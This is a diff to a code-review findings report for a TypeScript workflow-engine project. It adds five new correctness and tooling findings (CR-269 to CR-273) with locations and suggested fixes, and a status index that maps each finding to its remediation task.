+- **Re-verification note:** Re-checked against current docs/: 14 docs now cite ~100 backticked paths that don't exist (~70 genuine full-path misses, vs 17 at review time), because of the renames (lib/engine/flow.ts, templates.ts, nodes/base/*, jsonata-eval.ts, components/flows/plan/*). Some newly added docs are already stale, docs/pristine-plan.md still links docs/ai-elements-migration.md (missing) and docs/repo-detail-page.md (now only in docs/archive/), and eslint.config.mjs still cites phase0-baseline.md (28 stale refs) as its verification source. Move completed plan docs to docs/archive/ with a "paths may be stale" banner, and refresh phase0-baseline.md or repoint the lint comments to docs/architecture/.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 7b — Tooling & config
@@ -5877,6 +6962,65 @@ Original findings, verbatim:
   docs/phase0-baseline.md: missing types/format.ts
   ```
 - **Suggested fix:** Move completed plan docs into `docs/archive/` (already exists) with a "historical, paths may be stale" banner. Keep only living docs at the top level. Update `phase0-baseline.md` if lint comments keep citing it.
+- **Effort:** S
+
+## Findings: New at `abaa007` (5)
+
+Found while re-verifying. Numbered after the original items.
+
+### CR-269 [Medium] Chat-only replies run inside `bg()`, so an agent error flips a finished node to `failed`
+
+- **Status at `abaa007`:** **Open**, fix in [Task 16](review-tasks/16-run-lifecycle-late-writes.md)
+- **Severity:** Medium
+- **Category:** Correctness
+- **Area:** Area 2 — Engine core & shared lib (ENG)
+- **Source:** re-verification (NEW-B1)
+- **Location:** lib/engine/flow-engine.ts:598-615,1726-1746, lib/engine/nodes/shared/agent-run-node.ts:81-105, lib/engine/harness/agent-runner.ts:171-182
+- **Problem and suggested fix:** The chat-only ("just chat") path claims to leave node state untouched, but `sendChat` runs it through `bg(flowId, nodeKey, …)`, whose catch sets the node to `failed`. Any agent start or stream error during a question therefore flips an `approved`/`done`/`awaiting_approval` node to `failed`. Also, because `converse()` uses `executeRun` on a non-running node, every successful reply emits a misleading "result arrived after the node was already … — ignoring" lifecycle event. Run the chat-only branch with `bg(flowId, null, …)`, or catch and reply with the error, and give `executeRun` a converse mode that skips the late-write guard event.
+- **Effort:** S
+
+### CR-270 [High] `NodeSupport.artifactsOfKind` has no `ORDER BY`, so "latest plan" reads return an arbitrary (oldest) version
+
+- **Status at `abaa007`:** **Open**, fix in [Task 01](review-tasks/01-plan-artifact-ordering-hotfix.md)
+- **Severity:** High
+- **Category:** Correctness
+- **Area:** Area 3 — Engine nodes (NODE)
+- **Source:** re-verification (NEW-C1)
+- **Location:** lib/engine/nodes/shared/node-support.ts:120-149 (consumers: lib/engine/nodes/kinds/build/build-node.ts:175, 358, 412; lib/engine/nodes/kinds/build/step-build-node.ts:291; lib/engine/nodes/kinds/plan/plan-store.ts:32; lib/engine/nodes/kinds/plan/plan-context.ts:125)
+- **Problem and suggested fix:** `artifactsOfKind` is documented as "newest first", but its SQL has no `ORDER BY a.version DESC`, so `latestArtifact(...)` returns the OLDEST version (checked against schema.sql in an in-memory DB: three plan versions give v1). Meanwhile `FlowEngine.latestResourceArtifact` (flow-engine.ts:903-910) orders correctly. As a result, approve marks vN approved while the build builds plan v1; `PlanStore.latestPlan` feeds stale v1 meta into turn routing, scoped refines and split units (a branch refine merges into v1 and drops later revisions); and the previous-versions context block shows the oldest three. Fix: add `ORDER BY a.version DESC, a.created_at DESC` to both branches (which are also identical apart from the bound param) and add a NodeSupport test with multiple versions.
+- **Effort:** S
+
+### CR-271 [Medium] Chat send failures are never shown to the user
+
+- **Status at `abaa007`:** **Open**, fix in [Task 15](review-tasks/15-frontend-mutation-conventions.md)
+- **Severity:** Medium
+- **Category:** Correctness
+- **Area:** Area 5 — Flow runtime UI (FLOWUI)
+- **Source:** re-verification (NEW-D1)
+- **Location:** components/chat/ChatPanel.tsx:117-123, components/chat/ChatPanel.tsx:195-200, components/chat/hooks/useChatComposer.ts:61-65, components/chat/components/chatComposerForm/ChatComposerForm.tsx:143-151, components/flows/panels/NodeChat.tsx:17-29, components/flows/components/plan/PlanNodeChat.tsx:46-62
+- **Problem and suggested fix:** Chat send failures are invisible. `useChatComposer` returns `error`, but `ChatPanel` only takes `sendMessageMutation` and `isPending`; neither `NodeChat` nor `PlanNodeChat` passes `sendError`; and `ChatComposerForm` swallows the rejection (`.catch(() => {})`). A failed `POST /chat` (run start rejected, 4xx or 5xx) therefore just re-enables the textarea with no message or retry. Fix: have `ChatPanel` render `useChatComposer().error?.message` as the send error (with `reset()` on the next edit), and drop the now-unused `sendError` prop.
+- **Effort:** S
+
+### CR-272 [Low] `seed-split-smoke --reset` throws a foreign-key error when smoke flows exist
+
+- **Status at `abaa007`:** **Open**, fix in [Task 06](review-tasks/06-db-path-and-seed-safety.md)
+- **Severity:** Low
+- **Category:** Correctness
+- **Area:** Area 7b — Tooling & config (TOOL)
+- **Source:** re-verification (NEW-E1)
+- **Location:** scripts/seed-split-smoke.mjs:263-268, scripts/seed-split-smoke.mjs:191-197, lib/db/schema.sql:22
+- **Problem and suggested fix:** The new `seed-split-smoke --reset` keeps the template when flows reference it, but then unconditionally runs `DELETE FROM tasks WHERE id=TASK_ID`. `flows.task_id REFERENCES tasks(id)` and better-sqlite3 enforces FKs by default, so the reset throws SQLITE_CONSTRAINT_FOREIGNKEY whenever a smoke flow exists. Fix: delete the task's flows through the shared cascade helper from CR-159 first, or skip the task delete with a message, as the template branch does.
+- **Effort:** S
+
+### CR-273 [Medium] `tsc --noEmit` fails with 11 errors in tests and scripts, and no script runs it
+
+- **Status at `abaa007`:** **Open**, fix in [Task 02](review-tasks/02-typecheck-and-build-gates.md)
+- **Severity:** Medium
+- **Category:** Code quality
+- **Area:** Area 7b — Tooling & config (TOOL)
+- **Source:** re-verification (NEW-H1)
+- **Location:** tests/plan-diff.test.ts:72,87 (2 errors), lib/engine/runtime/split/split-manager.test.ts:234-236 (3), lib/engine/templates/split-smoke-template.test.ts:300,336-344 (4), lib/engine/nodes/kinds/plan/plan-split-units-demo.test.ts:154 (1), scripts/verify-prompt-parity.ts:214 (1), tsconfig.json:21
+- **Problem and suggested fix:** `npx tsc --noEmit` (with or without the incremental cache) currently reports 11 errors in 5 files, not just the single plan-diff error. Vitest doesn't type-check, so `npm test` stays green, and because tsconfig `include` covers `**/*.ts`, these files are also in the program `next build` type-checks. Fix the 11 errors, and add a `typecheck` script (`tsc --noEmit`) to package.json and the DoD so test and script type drift fails fast.
 - **Effort:** S
 
 ## Appendix: original ID to CR ID
@@ -6169,3 +7313,283 @@ Every one of the 284 original finding IDs appears exactly once below.
 | TOOL-23 | CR-266 | — | Low | `package.json` has no `engines` field, even though local mode requires Node ≥ 22.13; the `shadcn` CLI is a runtime dependency |
 | TOOL-24 | CR-267 | — | Low | `check-worktrees.ts` leaks its temp workspace on failure |
 | TOOL-25 | CR-268 | — | Low | Design and plan docs reference files that no longer exist |
+
+## Appendix: status index
+
+One row per finding, at `abaa007`.
+
+| CR | Severity | Type | Status | Task |
+| --- | --- | --- | --- | --- |
+| CR-001 | Critical | Security | Open | [Task 57](review-tasks/57-security-local-api-hardening.md) |
+| CR-002 | High | Security | Open | [Task 57](review-tasks/57-security-local-api-hardening.md) |
+| CR-003 | High | Gap | Open | [Task 10](review-tasks/10-api-input-validation-flows.md) |
+| CR-004 | High | Bug | Partly fixed | [Task 28](review-tasks/28-prompt-preview-parity.md) |
+| CR-005 | High | Bug | Open | [Task 13](review-tasks/13-frontend-query-ownership.md) |
+| CR-006 | High | Bug | Open | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
+| CR-007 | High | Bug | Open | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
+| CR-008 | High | Bug | Open | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
+| CR-009 | High | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
+| CR-010 | High | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
+| CR-011 | High | Bug | Open | [Task 21](review-tasks/21-multi-branch-correctness.md) |
+| CR-012 | High | Bug | Open | [Task 12](review-tasks/12-db-transactions.md) |
+| CR-013 | High | Bug | Open | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
+| CR-014 | High | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
+| CR-015 | High | Bug | Open | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
+| CR-016 | High | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-017 | High | Bug | Open | [Task 21](review-tasks/21-multi-branch-correctness.md) |
+| CR-018 | High | Bug | Fixed | — |
+| CR-019 | High | Bug | Open | [Task 21](review-tasks/21-multi-branch-correctness.md) |
+| CR-020 | High | Bug | Open | [Task 21](review-tasks/21-multi-branch-correctness.md) |
+| CR-021 | High | Infra | Open | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-022 | Medium | Infra | Open | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-023 | High | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
+| CR-024 | High | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
+| CR-025 | High | Gap | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-026 | High | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
+| CR-027 | High | Gap | Partly fixed | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
+| CR-028 | High | Bug | Open | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-029 | High | Bug | Open | [Task 37](review-tasks/37-editor-save-integrity.md) |
+| CR-030 | High | Bug | Open | [Task 37](review-tasks/37-editor-save-integrity.md) |
+| CR-031 | High | Bug | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-032 | High | Gap | Open | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
+| CR-033 | High | Bug | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-034 | High | Accessibility | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-035 | High | Bug | Open | [Task 42](review-tasks/42-settings-forms.md) |
+| CR-036 | High | Gap | Open | [Task 14](review-tasks/14-frontend-throwing-fetchers.md) |
+| CR-037 | High | Gap | Open | [Task 43](review-tasks/43-tasks-feature.md) |
+| CR-038 | High | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
+| CR-039 | High | Infra | Fixed | — |
+| CR-040 | High | Bug | Open | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
+| CR-041 | Medium | Infra | Partly fixed | [Task 05](review-tasks/05-test-coverage-baseline.md) |
+| CR-042 | Medium | Bug | Open | [Task 10](review-tasks/10-api-input-validation-flows.md) |
+| CR-043 | Medium | Bug | Open | [Task 29](review-tasks/29-webhook-reliability.md) |
+| CR-044 | Medium | Bug | Open | [Task 29](review-tasks/29-webhook-reliability.md) |
+| CR-045 | Medium | Bug | Open | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
+| CR-046 | Medium | Code quality | Open | [Task 09](review-tasks/09-typed-errors.md) |
+| CR-047 | Medium | Gap | Open | [Task 10](review-tasks/10-api-input-validation-flows.md) |
+| CR-048 | Medium | Bug | Open | [Task 11](review-tasks/11-api-input-validation-settings.md) |
+| CR-049 | Low | Code quality | Partly fixed | [Task 28](review-tasks/28-prompt-preview-parity.md) |
+| CR-050 | Medium | Bug | Open | [Task 12](review-tasks/12-db-transactions.md) |
+| CR-051 | Medium | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-052 | Medium | Code quality | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
+| CR-053 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-054 | Medium | Bug | Open | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
+| CR-055 | Medium | Bug | Open | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
+| CR-056 | Medium | Bug | Open | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
+| CR-057 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
+| CR-058 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
+| CR-059 | Medium | Bug | Open | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
+| CR-060 | Medium | Bug | Open | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
+| CR-061 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
+| CR-062 | Medium | Gap | Open | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
+| CR-063 | Medium | Gap | Open | [Task 23](review-tasks/23-graph-semantics-and-validation.md) |
+| CR-064 | Medium | Bug | Open | [Task 19](review-tasks/19-fanout-rollup-and-promises.md) |
+| CR-065 | Medium | Bug | Open | [Task 24](review-tasks/24-template-snapshot-and-yaml.md) |
+| CR-066 | Medium | Bug | Open | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
+| CR-067 | Medium | Bug | Open | [Task 12](review-tasks/12-db-transactions.md) |
+| CR-068 | Medium | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-069 | Medium | Security | Open | [Task 58](review-tasks/58-security-webhook-auth.md) |
+| CR-070 | Medium | Code quality | Open | [Task 45](review-tasks/45-flow-engine-decomposition.md) |
+| CR-071 | Medium | Code quality | Partly fixed | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
+| CR-072 | Medium | Bug | Open | [Task 17](review-tasks/17-node-claim-and-attempts.md) |
+| CR-073 | Medium | Bug | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-074 | Medium | Bug | Open | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
+| CR-075 | Medium | Bug | Open | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
+| CR-076 | Medium | Gap | Open | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-077 | Medium | Bug | Open | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-078 | Medium | Bug | Open | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-079 | Medium | Bug | Open | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-080 | Medium | Bug | Open | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-081 | Medium | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
+| CR-082 | Medium | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
+| CR-083 | Medium | Bug | Open | [Task 21](review-tasks/21-multi-branch-correctness.md) |
+| CR-084 | Medium | Bug | Open | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
+| CR-085 | Medium | Bug | Open | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
+| CR-086 | Medium | Bug | Open | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
+| CR-087 | Medium | Bug | Fixed | — |
+| CR-088 | Medium | Bug | Open | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
+| CR-089 | Low | Code quality | Partly fixed | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-090 | Medium | Code quality | Open | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
+| CR-091 | Medium | Code quality | Fixed | — |
+| CR-092 | Medium | Code quality | Partly fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
+| CR-093 | Medium | Code quality | Partly fixed | [Task 49](review-tasks/49-node-kind-structure.md) |
+| CR-094 | Medium | Code quality | Partly fixed | [Task 21](review-tasks/21-multi-branch-correctness.md) |
+| CR-095 | Medium | Code quality | Partly fixed | [Task 48](review-tasks/48-backend-dependency-injection.md) |
+| CR-096 | Medium | Code quality | Open | [Task 49](review-tasks/49-node-kind-structure.md) |
+| CR-097 | Low | Bug | Partly fixed | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
+| CR-098 | Medium | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-099 | Medium | Gap | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-100 | Medium | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-101 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
+| CR-102 | Medium | Gap | Open | [Task 32](review-tasks/32-agent-ports.md) |
+| CR-103 | Medium | Bug | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-104 | Medium | Bug | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-105 | Medium | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-106 | Medium | Bug | Open | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
+| CR-107 | Medium | Bug | Open | [Task 20](review-tasks/20-merge-arena-and-workspaces.md) |
+| CR-108 | Medium | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
+| CR-109 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
+| CR-110 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
+| CR-111 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
+| CR-112 | Medium | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
+| CR-113 | Medium | Performance | Open | [Task 34](review-tasks/34-db-row-safety.md) |
+| CR-114 | Medium | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
+| CR-115 | Medium | Code quality | Open | [Task 34](review-tasks/34-db-row-safety.md) |
+| CR-116 | Medium | Code quality | Open | [Task 48](review-tasks/48-backend-dependency-injection.md) |
+| CR-117 | Medium | Security | Open | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
+| CR-118 | Medium | Code quality | Open | [Task 48](review-tasks/48-backend-dependency-injection.md) |
+| CR-119 | Medium | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
+| CR-120 | Medium | Gap | Open | [Task 13](review-tasks/13-frontend-query-ownership.md) |
+| CR-121 | Medium | Bug | Open | [Task 13](review-tasks/13-frontend-query-ownership.md) |
+| CR-122 | Medium | Bug | Open | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-123 | Medium | Bug | Open | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-124 | Medium | Bug | Partly fixed | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-125 | Medium | Bug | Fixed | — |
+| CR-126 | Medium | Bug | Open | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
+| CR-127 | Medium | Bug | Open | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-128 | Medium | Bug | Partly fixed | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
+| CR-129 | Medium | Gap | Open | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
+| CR-130 | Medium | Bug | Open | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-131 | Medium | Accessibility | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
+| CR-132 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
+| CR-133 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
+| CR-134 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
+| CR-135 | Medium | Bug | Open | [Task 13](review-tasks/13-frontend-query-ownership.md) |
+| CR-136 | Medium | Bug | Open | [Task 37](review-tasks/37-editor-save-integrity.md) |
+| CR-137 | Medium | Bug | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-138 | Medium | Bug | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-139 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
+| CR-140 | Medium | Bug | Open | [Task 37](review-tasks/37-editor-save-integrity.md) |
+| CR-141 | Medium | Gap | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
+| CR-142 | Medium | Bug | Open | [Task 37](review-tasks/37-editor-save-integrity.md) |
+| CR-143 | Medium | Gap | Open | [Task 14](review-tasks/14-frontend-throwing-fetchers.md) |
+| CR-144 | Medium | Bug | Open | [Task 40](review-tasks/40-editor-performance.md) |
+| CR-145 | Medium | Performance | Open | [Task 40](review-tasks/40-editor-performance.md) |
+| CR-146 | Medium | Code quality | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-147 | Medium | Bug | Open | [Task 42](review-tasks/42-settings-forms.md) |
+| CR-148 | Medium | Bug | Open | [Task 43](review-tasks/43-tasks-feature.md) |
+| CR-149 | Medium | Gap | Open | [Task 42](review-tasks/42-settings-forms.md) |
+| CR-150 | Medium | Gap | Open | [Task 42](review-tasks/42-settings-forms.md) |
+| CR-151 | Medium | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
+| CR-152 | Medium | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
+| CR-153 | Medium | Bug | Open | [Task 43](review-tasks/43-tasks-feature.md) |
+| CR-154 | Medium | Security | Open | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
+| CR-155 | Medium | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
+| CR-156 | Medium | Accessibility | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-157 | Medium | Infra | Open | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
+| CR-158 | Medium | Infra | Obsolete (legacy, no fix) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-159 | Medium | Infra | Open | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
+| CR-160 | Medium | Infra | Partly fixed | [Task 05](review-tasks/05-test-coverage-baseline.md) |
+| CR-161 | Medium | Infra | Open | [Task 04](review-tasks/04-client-server-boundaries.md) |
+| CR-162 | Medium | Infra | Open | [Task 03](review-tasks/03-lint-rule-hardening.md) |
+| CR-163 | Medium | Infra | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-164 | Medium | Bug | Open | [Task 05](review-tasks/05-test-coverage-baseline.md) |
+| CR-165 | Medium | Infra | Open | [Task 04](review-tasks/04-client-server-boundaries.md) |
+| CR-166 | Medium | Code quality | Open | [Task 04](review-tasks/04-client-server-boundaries.md) |
+| CR-167 | Low | Code quality | Open | [Task 11](review-tasks/11-api-input-validation-settings.md) |
+| CR-168 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-169 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-170 | Low | Infra | Open | [Task 03](review-tasks/03-lint-rule-hardening.md) |
+| CR-171 | Low | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
+| CR-172 | Low | Bug | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-173 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
+| CR-174 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-175 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-176 | Low | Bug | Open | [Task 58](review-tasks/58-security-webhook-auth.md) |
+| CR-177 | Low | Code quality | Partly fixed | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-178 | Low | Performance | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-179 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
+| CR-180 | Low | Code quality | Open | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
+| CR-181 | Low | Code quality | Partly fixed | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
+| CR-182 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
+| CR-183 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
+| CR-184 | Low | Code quality | Open | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
+| CR-185 | Low | Performance | Open | [Task 45](review-tasks/45-flow-engine-decomposition.md) |
+| CR-186 | Low | Code quality | Open | [Task 50](review-tasks/50-small-module-cleanups.md) |
+| CR-187 | Low | Code quality | Open | [Task 07](review-tasks/07-remove-dead-and-legacy-code.md) |
+| CR-188 | Low | Code quality | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-189 | Low | Bug | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-190 | Low | Bug | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-191 | Low | Bug | Open | [Task 24](review-tasks/24-template-snapshot-and-yaml.md) |
+| CR-192 | Low | Bug | Open | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
+| CR-193 | Low | Bug | Open | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
+| CR-194 | Low | Performance | Open | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
+| CR-195 | Low | Code quality | Partly fixed | [Task 50](review-tasks/50-small-module-cleanups.md) |
+| CR-196 | Low | Security | Open | [Task 58](review-tasks/58-security-webhook-auth.md) |
+| CR-197 | Low | Code quality | Open | [Task 50](review-tasks/50-small-module-cleanups.md) |
+| CR-198 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-199 | Low | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
+| CR-200 | Low | Bug | Open | [Task 26](review-tasks/26-node-config-validation.md) |
+| CR-201 | Low | Code quality | Partly fixed | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
+| CR-202 | Low | Code quality | Partly fixed | [Task 46](review-tasks/46-backend-types-cleanup.md) |
+| CR-203 | Low | Bug | Partly fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
+| CR-204 | Low | Code quality | Fixed | — |
+| CR-205 | Low | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
+| CR-206 | Low | Code quality | Open | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
+| CR-207 | Low | Code quality | Partly fixed | [Task 07](review-tasks/07-remove-dead-and-legacy-code.md) |
+| CR-208 | Low | Code quality | Open | [Task 49](review-tasks/49-node-kind-structure.md) |
+| CR-209 | Low | Bug | Open | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
+| CR-210 | Low | Infra | Open | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-211 | Low | Bug | Obsolete (legacy, no fix) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-212 | Low | Performance | Obsolete (legacy, no fix) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-213 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
+| CR-214 | Low | Code quality | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-215 | Low | Code quality | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-216 | Low | Code quality | Open | [Task 50](review-tasks/50-small-module-cleanups.md) |
+| CR-217 | Low | Code quality | Open | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
+| CR-218 | Low | Bug | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-219 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-220 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-221 | Low | Infra | Open | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
+| CR-222 | Low | Code quality | Partly fixed | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-223 | Low | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
+| CR-224 | Low | Bug | Open | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
+| CR-225 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
+| CR-226 | Low | Bug | Fixed | — |
+| CR-227 | Low | Bug | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
+| CR-228 | Low | Code quality | Partly fixed | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
+| CR-229 | Low | Code quality | Open | [Task 54](review-tasks/54-feature-layout-and-naming.md) |
+| CR-230 | Low | Code quality | Partly fixed | [Task 54](review-tasks/54-feature-layout-and-naming.md) |
+| CR-231 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-232 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
+| CR-233 | Low | Performance | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
+| CR-234 | Low | Performance | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
+| CR-235 | Low | Code quality | Open | [Task 35](review-tasks/35-cockpit-panel-state.md) |
+| CR-236 | Low | Code quality | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
+| CR-237 | Low | Bug | Open | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
+| CR-238 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
+| CR-239 | Low | Code quality | Open | [Task 54](review-tasks/54-feature-layout-and-naming.md) |
+| CR-240 | Low | Accessibility | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
+| CR-241 | Low | Bug | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-242 | Low | Bug | Open | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
+| CR-243 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
+| CR-244 | Low | Bug | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
+| CR-245 | Low | Code quality | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
+| CR-246 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
